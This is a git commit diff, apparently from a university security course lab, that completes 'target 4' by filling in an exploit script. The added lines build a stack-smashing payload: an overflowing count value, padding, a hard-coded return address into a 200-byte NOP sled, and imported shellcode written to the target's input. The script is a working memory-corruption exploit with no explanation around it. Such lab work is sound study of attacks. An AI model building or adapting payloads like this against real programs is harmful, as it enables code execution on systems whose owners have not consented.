3a4c2899f42469774c946a56239ab2aece0573d3
dconnorj <connor_dalley@protonmail.com>
2024-10-14 13:10:58 -0600

    completed target 4

--- A2/targets/sol4.py
+++ A2/targets/sol4.py
@@ -3,7 +3,12 @@ from struct import pack
 from shellcode import shellcode
 
 # Implement your attack here!
-payload = ''
+count =  pack('<I',0xFFFFFFFF)
+nop_addr = pack('<I', 0xfff6ef38+50)
+padding = b'\x02' * 44
+slide = b'\x90' * 200
+
+payload = count + padding + nop_addr +  slide + shellcode
 
 # Launch the attack!
 sys.stdout.buffer.write(payload)
